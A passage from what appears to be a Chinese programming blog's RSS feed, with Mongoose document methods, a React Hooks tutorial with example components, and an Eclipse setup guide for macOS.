// })
StuModel.findOne({},function(err, doc){
    // &#x65B9;&#x5F0F;&#x4E00;
    // if(!err){
    //     // update(update,[option],[callback])
    //     doc.updateOne({$set:{age:20}},function(err){
    //         if(!err){
    //             console.log(&quot;&#x4FEE;&#x6539;&#x6210;&#x529F;&quot;);
    //         }
    //     })
    // }
    // &#x65B9;&#x5F0F;&#x4E8C;
    // doc.age = 19;
    // doc.save();
    // doc.remove(function(err) {
    //     if(!err){
    //         console.log(&quot;&#x5927;&#x5E08;&#x5144;&#x518D;&#x89C1;&quot;);
    //     }
    // })
    // get(name) &#x83B7;&#x53D6;&#x6587;&#x6863;&#x4E2D;&#x6307;&#x5B9A;&#x5C5E;&#x6027;&#x503C;
    // console.log(doc.get(&quot;name&quot;)); // &#x7B49;&#x4EF7;&#x4E8E; console.log(doc.name);
    // set(name, value) &#x8BBE;&#x7F6E;&#x6587;&#x6863;&#x6307;&#x5B9A;&#x5C5E;&#x6027;&#x503C;
    // doc.set(&quot;name&quot;,&quot;nicebjj&quot;) // &#x6570;&#x636E;&#x5E93;&#x4E0D;&#x53D8;,&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x8C03;&#x7528;save &#x7B49;&#x4EF7;&#x4E8E; doc.name=&quot;hahaha&quot;
    // console.log(doc);
    // toJSON() &#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x4E2A;JSON&#x5BF9;&#x8C61;
    // toObject() &#x6587;&#x6863;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7684;js&#x5BF9;&#x8C61; &#x2014;&#x2014; &#x90E8;&#x5206;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x4E0D;&#x4E86;
})
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mongodb-nodejs-driver">MongoDB NodeJS Driver</h2>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 &#x534F;&#x8BAE;</a> &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;  <a href="https://blog.zairesinatra.com">zairesinatra&apos;s blog</a>&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[React Hooks]]></title><description><![CDATA[常用 React hooks 总结]]></description><link>yourdomain.com/react/</link><guid isPermaLink="false">613b1addc96a89175de94fb4</guid><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Sun, 16 May 2021 14:57:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/09/react-hooks.jpg" medium="image"/><content:encoded><![CDATA[<img src="yourdomain.com/content/images/2021/09/react-hooks.jpg" alt="React Hooks"><p>Hook &#x662F; React 16.8 &#x7684;&#x65B0;&#x7279;&#x6027;&#x3002;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x7F16;&#x5199; class &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F7F;&#x7528; state &#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x7684; React &#x7279;&#x6027;&#x3002;Hook &#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x6761;&#x4EF6;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x56E0;&#x4E3A;&#x5FC5;&#x987B;&#x4FDD;&#x6301;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x7684;&#x6E32;&#x67D3;&#x987A;&#x5E8F;&#x3002;&#x5C06;&#x7EC4;&#x4EF6;&#x4F5C;&#x4E3A;&#x7EAF;&#x7CB9;&#x7684;&#x4F20;&#x9012;&#x6570;&#x636E;&#x7684;&#x7BA1;&#x9053;&#x5C31;&#x662F; Hooks &#x5B58;&#x5728;&#x7684;&#x610F;&#x4E49;&#x3002;</p><!--kg-card-begin: markdown--><h2 id="usestate-%E7%8A%B6%E6%80%81%E9%92%A9%E5%AD%90">useState &#x72B6;&#x6001;&#x94A9;&#x5B50;</h2>
<p>&#x7EAF;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x6CA1;&#x6709;&#x72B6;&#x6001;&#xFF0C;&#x6545;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; useState &#x4E3A;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x5F15;&#x5165;&#x72B6;&#x6001;&#x3002;useState &#x63A5;&#x53D7;&#x72B6;&#x6001;&#x7684;&#x521D;&#x59CB;&#x503C;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x5176;&#x4E2D;&#x6570;&#x7EC4;&#x7B2C;&#x4E00;&#x9879;&#x4E3A;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x6307;&#x5411;&#x72B6;&#x6001;&#x7684;&#x5F53;&#x524D;&#x503C;&#xFF0C;&#x7C7B;&#x4F3C; this.state&#x3002;&#x7B2C;&#x4E8C;&#x9879;&#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x7528;&#x6765;&#x66F4;&#x65B0;&#x72B6;&#x6001;&#xFF0C;&#x7C7B;&#x4F3C; this.setState&#x3002;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x547D;&#x540D;&#x7EA6;&#x5B9A; set &#x524D;&#x7F00;&#x52A0;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#x540D;&#x3002;</p>
<pre><code class="language-js">import React, { useState } from &quot;react&quot;;

function UseStatehook() {
  // ES6&#x8BED;&#x6CD5;&#x4E2D;&#x7684;&#x6570;&#x7EC4;&#x89E3;&#x6784;
  const [name, setName] = useState(&quot;zstheyi&quot;);
  const [age, setAge] = useState(22);
  const [work, setWork] = useState(&quot;frontendenv&quot;);
  return (
    &lt;div&gt;
      &lt;span&gt;{name}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;span&gt;{age}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;span&gt;{work}&lt;/span&gt;&amp;nbsp;
      &lt;button
        onClick={() =&gt; {
          setAge(age + 1);
        }}
      &gt;
        click me add age
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          setName(&quot;zsxzy&quot;);
        }}
      &gt;
        change my name
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          setWork(&quot;fullstack&quot;);
        }}
      &gt;
        what&apos;s my field
      &lt;/button&gt;
    &lt;/div&gt;
  );
}
export default UseStatehook;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="usecontext-%E5%85%B1%E4%BA%AB%E7%8A%B6%E6%80%81%E9%92%A9%E5%AD%90">useContext &#x5171;&#x4EAB;&#x72B6;&#x6001;&#x94A9;&#x5B50;</h2>
<p>useContext hook &#x7684;&#x4F5C;&#x7528;&#x662F;&#x5728;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x5171;&#x4EAB;&#x72B6;&#x6001;&#x3002;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;Context &#x4F5C;&#x7528;&#x662F;&#x72B6;&#x6001;&#x7684;&#x5206;&#x53D1;&#xFF0C;&#x907F;&#x514D; react &#x9010;&#x5C42;&#x901A;&#x8FC7; props &#x4F20;&#x9012;&#x6570;&#x636E;&#x3002;</p>
<pre><code class="language-js">import React, { useState, createContext, useContext } from &quot;react&quot;;
// CountContext&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7EC4;&#x4EF6;
const CountContext = createContext();
function UseContexthook() {
  const [count, setCount] = useState(6);
  return (
    &lt;div&gt;
      &lt;p&gt;You clicked {count} times&lt;/p&gt;
      &lt;button
        onClick={() =&gt; {
          setCount(count + 1);
        }}
      &gt;
        click me
      &lt;/button&gt;
      &lt;CountContext.Provider value={count}&gt;
        &lt;Isolation /&gt;
      &lt;/CountContext.Provider&gt;
    &lt;/div&gt;
  );
}
// &#x7A7F;&#x900F;&#x9694;&#x79BB;&#x7EC4;&#x4EF6;
function Isolation() {
  return (
    &lt;Counter /&gt;
  )
}
// &#x63D0;&#x4F9B;&#x63A5;&#x6536;&#x7EC4;&#x4EF6;
function Counter() {
  const count = useContext(CountContext); //&#x4E00;&#x53E5;&#x8BDD;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;count
  return &lt;h3&gt;{count}&lt;/h3&gt;;
}
export default UseContexthook;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="useeffect-%E4%BB%A3%E6%9B%BF%E5%B8%B8%E7%94%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0">useEffect &#x4EE3;&#x66FF;&#x5E38;&#x7528;&#x751F;&#x547D;&#x5468;&#x671F;&#x51FD;&#x6570;</h2>
<p>&#x7C7B;&#x7EC4;&#x4EF6;&#x901A;&#x8FC7;&#x751F;&#x547D;&#x5468;&#x671F;&#x51FD;&#x6570;&#x5904;&#x7406;&#x989D;&#x5916;&#x7684;&#x64CD;&#x4F5C;&#xFF08;Ajax &#x8BF7;&#x6C42;&#x6570;&#x636E;&#xFF0C;&#x767B;&#x5F55;&#x76D1;&#x542C;&#x548C;&#x53D6;&#x6D88;&#x767B;&#x5F55;&#xFF0C;&#x624B;&#x52A8;&#x4FEE;&#x6539; DOM &#x7B49;&#xFF09;&#x3002;useEffect Hook &#x53EF;&#x4EE5;&#x770B;&#x505A; componentDidMount&#xFF0C;componentDidUpdate &#x548C; componentWillUnmount &#x8FD9;&#x4E09;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x5728;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x4E2D;&#x6267;&#x884C;&#x526F;&#x4F5C;&#x7528;&#x64CD;&#x4F5C;&#x3002;&#x503C;&#x5F97;&#x4E00;&#x63D0;&#x7684;&#x662F; useEffect &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#x6267;&#x884C;&#x4E0D;&#x4F1A;&#x963B;&#x788D;&#x6D4F;&#x89C8;&#x5668;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x4E9B;&#x51FD;&#x6570;&#x662F;&#x5F02;&#x6B65;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x800C;&#x7C7B;&#x7EC4;&#x4EF6;&#x751F;&#x547D;&#x5468;&#x671F;&#x7684;&#x4EE3;&#x7801;&#x90FD;&#x662F;&#x540C;&#x6B65;&#x6267;&#x884C;&#x7684;&#x3002;useEffect &#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x8868;&#x793A;&#x671F;&#x5F85;&#x7684;&#x526F;&#x4F5C;&#x7528;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x89E3;&#x7ED1;&#x65F6;&#x7684;&#x64CD;&#x4F5C;&#x3002;useEffect hook &#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x6570;&#x7EC4;&#x4E2D;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x5F88;&#x591A;&#x72B6;&#x6001;&#x5BF9;&#x5E94;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x610F;&#x601D;&#x662F;&#x5F53;&#x72B6;&#x6001;&#x503C;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#x624D;&#x8FDB;&#x884C;&#x89E3;&#x7ED1;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x4F20;&#x7A7A;&#x6570;&#x7EC4; [] &#x65F6;&#xFF0C;&#x5219;&#x4E3A;&#x5F53;&#x7EC4;&#x4EF6;&#x5C06;&#x88AB;&#x9500;&#x6BC1;&#x624D;&#x8FDB;&#x884C;&#x89E3;&#x7ED1;&#xFF0C;&#x5B9E;&#x73B0;&#x7CBE;&#x786E;&#x7684; componentWillUnmount &#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-js">import React, { useState, useEffect } from &quot;react&quot;;
import { BrowserRouter as Router, Route, Link } from &quot;react-router-dom&quot;;
function Index() {
  useEffect(() =&gt; {
    console.log(&quot;useEffect=&gt;Indexpage&quot;);
    return () =&gt; {
      console.log(&quot;&#x544A;&#x8F9E; Index page&quot;);
    };
    // &#x5F53;&#x4F20;&#x7A7A;&#x6570;&#x7EC4;[]&#x65F6;&#x5C31;&#x662F;&#x5F53;&#x7EC4;&#x4EF6;&#x5C06;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x624D;&#x8FDB;&#x884C;&#x89E3;&#x7ED1;
  }, []);
  return &lt;h2&gt;indexxx&lt;/h2&gt;;
}

function OtherPage() {
  useEffect(() =&gt; {
    console.log(&quot;useEffect=&gt;otherPage&quot;);
    return () =&gt; {
      console.log(&quot;&#x544A;&#x8F9E; Other page&quot;);
    };
  }, []);
  return &lt;h2&gt;otherPage&lt;/h2&gt;;
}
function useEffectHook() {
  const [count, setCount] = useState(0);
  useEffect(() =&gt; {
    console.log(`useEffect=&gt;You clicked ${count} times`);
    return () =&gt; {
      console.log(&quot;&#x6211;&#x9500;&#x6BC1;&#x4E86;&#x7B28;&#x86CB;&quot;);
    };
    // &#x5F53;count&#x53D8;&#x5316;&#x65F6;&#x63A5;&#x7ED1;
  }, [count]);
  return (
    &lt;div&gt;
      &lt;p&gt;You clicked {count} times&lt;/p&gt;
      &lt;button
        onClick={() =&gt; {
          setCount(count + 1);
        }}
      &gt;
        click me
      &lt;/button&gt;
      &lt;Router&gt;
        &lt;ul&gt;
          &lt;li&gt;
            &lt;Link to=&quot;/&quot;&gt;indexPage&lt;/Link&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;Link to=&quot;/otherPage&quot;&gt;otherPage&lt;/Link&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
        &lt;Route path=&quot;/&quot; exact component={Index} /&gt;
        &lt;Route path=&quot;/otherPage&quot; component={OtherPage} /&gt;
      &lt;/Router&gt;
    &lt;/div&gt;
  );
}
export default useEffectHook;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="usereducer">useReducer</h2>
<p>useReducer &#x662F; useState &#x7684;&#x66FF;&#x4EE3;&#x65B9;&#x6848;&#x3002;&#x63A5;&#x6536;&#x4E00;&#x4E2A; reducer&#xFF08;reducer &#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x63A5;&#x6536;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x72B6;&#x6001;&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x63A7;&#x5236;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x7684;&#x5224;&#x65AD;&#x53C2;&#x6570;&#x3002;(state, action) =&gt; newState&#xFF09;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x7684; state &#x4EE5;&#x53CA;&#x4E0E;&#x5176;&#x914D;&#x5957;&#x7684; dispatch &#x65B9;&#x6CD5;&#x3002;&#x5728;&#x67D0;&#x4E9B;&#x573A;&#x666F;&#x4E0B;&#xFF0C;useReducer &#x4F1A;&#x6BD4; useState &#x66F4;&#x9002;&#x7528;&#xFF0C;&#x4F8B;&#x5982; state &#x903B;&#x8F91;&#x8F83;&#x590D;&#x6742;&#x4E14;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x5B50;&#x503C;&#xFF0C;&#x6216;&#x8005;&#x4E0B;&#x4E00;&#x4E2A; state &#x4F9D;&#x8D56;&#x4E8E;&#x4E4B;&#x524D;&#x7684; state &#x7B49;&#x3002;&#x5E76;&#x4E14;&#x4F7F;&#x7528; useReducer &#x8FD8;&#x80FD;&#x7ED9;&#x90A3;&#x4E9B;&#x4F1A;&#x89E6;&#x53D1;&#x6DF1;&#x66F4;&#x65B0;&#x7684;&#x7EC4;&#x4EF6;&#x505A;&#x6027;&#x80FD;&#x4F18;&#x5316;&#xFF0C;&#x56E0;&#x4E3A;&#x53EF;&#x4EE5;&#x5411;&#x5B50;&#x7EC4;&#x4EF6;&#x4F20;&#x9012; dispatch &#x800C;&#x4E0D;&#x662F;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x3002;useReducer &#x63A5;&#x6536;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x9879;&#x662F; reducer &#x51FD;&#x6570;&#xFF0C;&#x7B2C;&#x4E8C;&#x9879;&#x662F;&#x6307;&#x5B9A;&#x521D;&#x59CB;  state&#x3002;</p>
<pre><code class="language-js">import React, { useReducer } from &quot;react&quot;;
const reducerrr = (state, action) =&gt; {
  switch (action) {
    case &quot;add&quot;:
      return state + 1;
    case &quot;sub&quot;:
      return state - 1;
    case &quot;reset&quot;:
      return state - state;
    default:
      return state;
  }
};
function UseReducee() {
  const [count, dispatch] = useReducer(reducerrr, 0);
  return (
    &lt;div&gt;
      &lt;h2&gt;reduce control {count}&lt;/h2&gt;
      &lt;button onClick={() =&gt; dispatch(&quot;add&quot;)}&gt;Increment&lt;/button&gt;
      &lt;button onClick={() =&gt; dispatch(&quot;sub&quot;)}&gt;Decrement&lt;/button&gt;
      &lt;button onClick={() =&gt; dispatch(&quot;reset&quot;)}&gt;Reset&lt;/button&gt;
    &lt;/div&gt;
  );
}

export default UseReducee;
</code></pre>
<p>&#x60F0;&#x6027;&#x521D;&#x59CB;&#x5316; state</p>
<pre><code class="language-js">import React, { useReducer } from &quot;react&quot;;

const initCount = 0;

const init = (initCount) =&gt; {
  return { count: initCount };
};

const reducer = (state, action) =&gt; {
  switch (action.type) {
    case &quot;increment&quot;:
      return { count: state.count + 1 };
    case &quot;decrement&quot;:
      return { count: state.count - 1 };
    case &quot;reset&quot;:
      return init(action.payload || 0);
    default:
      throw new Error();
  }
};
const UseReduceHook = () =&gt; {
  const [state, dispatch] = useReducer(reducer, initCount, init);

  return (
    &lt;div className=&quot;App&quot;&gt;
      &lt;div&gt;useReducer Count:{state.count}&lt;/div&gt;
      &lt;button
        onClick={() =&gt; {
          dispatch({ type: &quot;decrement&quot; });
        }}
      &gt;
        useReducer &#x51CF;&#x5C11;
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          dispatch({ type: &quot;increment&quot; });
        }}
      &gt;
        useReducer &#x589E;&#x52A0;
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          dispatch({ type: &quot;reset&quot;, payload: 999 });
        }}
      &gt;
        resetTo
      &lt;/button&gt;
    &lt;/div&gt;
  );
};
export default UseReduceHook;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><h2>&#x5168;&#x5C40;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;</h2>
<iframe src="https://codesandbox.io/embed/adoring-chatelet-u0pc9?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="adoring-chatelet-u0pc9" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe><!--kg-card-end: html--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[🌒Eclipse配置]]></title><description><![CDATA[Java 开发环境 Eclipse 配置]]></description><link>yourdomain.com/eclipse/</link><guid isPermaLink="false">60f202ed0c77773fa52cbc2c</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 22 Apr 2021 13:36:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/07/eeclipse.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%AE%89%E8%A3%85-eclipse">&#x5B89;&#x88C5; Eclipse</h2>
<ul>
<li>&#x786E;&#x8BA4; Mac &#x4E0A;&#x662F;&#x5426;&#x5DF2;&#x5B89;&#x88C5; java &#x8FD0;&#x884C;&#x73AF;&#x5883;</li>
</ul>
<pre><code class="language-shell">$ java -version
# java version &quot;11.0.11&quot; 2021-04-20 LTS
# Java(TM) SE Runtime Environment 18.9 (build 11.0.11+9-LTS-194)
# Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.11+9-LTS-194, mixed mode)
</code></pre>
<ul>
<li>&#x5B89;&#x88C5;&#x5408;&#x9002;&#x7684; Eclipse &#x7248;&#x672C;</li>
</ul>
<pre><code class="language-shell">$ brew install --cask eclipse-java
# &#x6216;&#x8005;&#x53BB;&#x5B98;&#x7F51; https://www.eclipse.org/downloads/packages/
</code></pre>
<ul>
<li>&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x5728;&#x5148;&#x524D;&#x6307;&#x5B9A;&#x8DEF;&#x5F84;&#x5C06; Eclipse &#x6DFB;&#x52A0;&#x5230;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;</li>
</ul>
<pre><code class="language-shell"># &#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;
/Users/${zsxzy}/eclipse
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E9%85%8D%E7%BD%AE-eclipse">&#x914D;&#x7F6E; Eclipse</h2>
<ul>
<li>Preferences =&gt; Java =&gt; installed JREs &#x914D;&#x7F6E; JDK &#xFF1A;add &#x589E;&#x52A0; Standard VM &#x7684; JRE Types&#xFF0C;&#x5E76;&#x6307;&#x5B9A; JDK &#x5B89;&#x88C5;&#x7684; Home &#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;&#x3002;&#x8FD9;&#x91CC;&#x9009;&#x62E9; Standard VM &#x662F;&#x56E0;&#x4E3A; Oracle&#xFF08;&#x4EE5;&#x524D;&#x662F; Sun&#xFF09;&#x5B9E;&#x73B0;&#x7684; JRE Type &#x5411;&#x540E;&#x517C;&#x5BB9;&#x6027;&#x8F83;&#x597D;&#x3002;&#x53C2;&#x8003;&#x672C;&#x4EBA; add JRE &#x586B;&#x5199;&#x540E; Finish&#x3002;</li>
</ul>
<pre><code class="language-shell">JRE HOME: /Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk/Contents/Home
JRE NAME: HOME
</code></pre>
<ul>
<li>&#x4E3A;&#x9632;&#x6B62;&#x5DE5;&#x4F5C;&#x533A;&#x6587;&#x4EF6;&#x4E71;&#x7801;&#xFF0C;&#x5728; Preference =&gt; General =&gt; workspace &#x52FE;&#x9009; Defalt(UTF-8)&#x9009;&#x9879;&#x5E76; Apply &#x3002;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="eclipse-%E8%AE%BE%E7%BD%AE%E8%AF%AD%E8%A8%80">Eclipse &#x8BBE;&#x7F6E;&#x8BED;&#x8A00;</h2>
<ul>
<li>&#x4E2D;&#x6587;</li>
</ul>
<img src="yourdomain.com/content/images/2021/07/eeclipse.jpg" alt="&#x1F312;Eclipse&#x914D;&#x7F6E;"><p>Help =&gt; Install New SoftWare &#x4E2D;&#x70B9;&#x51FB; add &#x6DFB;&#x52A0;&#x4ECE;<a href="https://www.eclipse.org/babel/downloads.php">&#x6B64;&#x94FE;&#x63A5;</a>&#x9002;&#x914D;&#x7248;&#x672C;&#x7684;&#x4E2D;&#x6587;&#x63D2;&#x4EF6;&#x5305;&#x3002;&#x8FD9;&#x91CC;&#x6CE8;&#x610F;&#x5982;&#x679C;&#x5728;&#x9009;&#x62E9; Babel Language Packs in Chinese(Simplified) &#x5168;&#x90E8;&#x5B89;&#x88C5;&#xFF0C;&#x5728;&#x672C;&#x4EBA; X86 &#x67B6;&#x6784;&#x7684; mac &#x51FA;&#x73B0; Eclipse &#x635F;&#x574F;&#x7684;&#x60C5;&#x51B5;&#xFF08;MacM1 &#x672A;&#x51FA;&#x73B0;&#x6B64;&#x635F;&#x6BC1;&#xFF09;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x4E0D;&#x9009;&#x62E9; for rt.rap &#x7684;&#x9879;&#x76EE;&#x5305;&#x3002;</p>
<p><img src="yourdomain.com/content/images/2021/09/choosezh.png" alt="&#x1F312;Eclipse&#x914D;&#x7F6E;" loading="lazy"></p>
<ul>
<li>&#x82F1;&#x6587;</li>
</ul>
<p>&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x627E;&#x5230; Eclipse&#xFF0C;&#x9009;&#x62E9; Show Package Contents&#xFF0C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#x6253;&#x5F00;&#x5728; Contents &#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x7684; Info.plist&#x3002;&#x5728;&#x5728; Eclipsekey &#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x547D;&#x4EE4;&#x884C;&#x9009;&#x9879;&#x3002;</p>
<pre><code class="language-javascript">&lt;string&gt;-nl&lt;/string&gt;&lt;string&gt;en&lt;/string&gt;
</code></pre>
<p><img src="yourdomain.com/content/images/2021/09/changebacken.png" alt="&#x1F312;Eclipse&#x914D;&#x7F6E;" loading="lazy"></p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="git-version-control">Git Version Control</h2>
<ul>
<li>
<p>Help =&gt; Install New SoftWare &#x4E2D;&#x70B9;&#x51FB; add &#x6DFB;&#x52A0;&#x4ECE;<a href="http://download.eclipse.org/egit/updates/">&#x6B64;&#x94FE;&#x63A5;</a>&#x9002;&#x914D;&#x7248;&#x672C;&#x7684; EGit &#x63D2;&#x4EF6;&#x5305;&#xFF0C;&#x8F7D;&#x5165;&#x540E;&#x5168;&#x9009;&#x7EC4;&#x4EF6;&#x5E76;&#x8FDB;&#x884C;&#x5B89;&#x88C5;&#x3002;</p>
</li>
<li>
<p>&#x786E;&#x8BA4; Preference =&gt; version control =&gt; Git =&gt; config =&gt; User Settings &#x6DFB;&#x52A0;&#xFF08;&#x82E5;&#x5B89;&#x88C5;&#x8FC7; Git &#x5E76;&#x94FE;&#x63A5;&#x8FC7; Github &#x5219;&#x4F1A;&#x5B58;&#x5728;&#x5DF2;&#x81EA;&#x52A8;&#x8F7D;&#x5165;&#x5B8C;&#x6BD5;&#xFF09;&#x90AE;&#x7BB1;&#x4E0E;&#x7528;&#x6237;&#x540D;&#x3002;</p>
</li>
<li>
<p>&#x5728; Team =&gt; Share Project &#x5EFA;&#x8BAE;&#x81EA;&#x5B9A;&#x4E49; new repo &#x53BB;&#x5B9E;&#x73B0; Repository &#x5B58;&#x653E;&#x8DEF;&#x5F84;&#x3002;</p>
</li>
</ul>
<pre><code class="language-shell">/User/zsxzy/git/repository/(.git)
# .git &#x4F1A;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;,&#x65E0;&#x9700;&#x586B;&#x5199;
</code></pre>
<ul>
<li>commit =&gt; Remote =&gt; Push &#x94FE;&#x63A5;&#x81F3; Github &#x5E76;&#x9009;&#x62E9; Source ref &#x522B;&#x79F0;&#x9879;&#x4E3A; <code>refs/head/master</code> &#x5B8C;&#x6210; Add Spec&#x3002;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="java-%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8">Java &#x81EA;&#x52A8;&#x8865;&#x5168;</h2>
<p>Preference =&gt; Java =&gt; Editor =&gt; Content Assist =&gt; java automatic activation trigger &#x4E2D;&#x8865;&#x5168;&#x5355;&#x8BCD;&#x89E6;&#x53D1;&#x3002;</p>
<pre><code class="language-java">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="javaee-perspective">JavaEE perspective</h2>
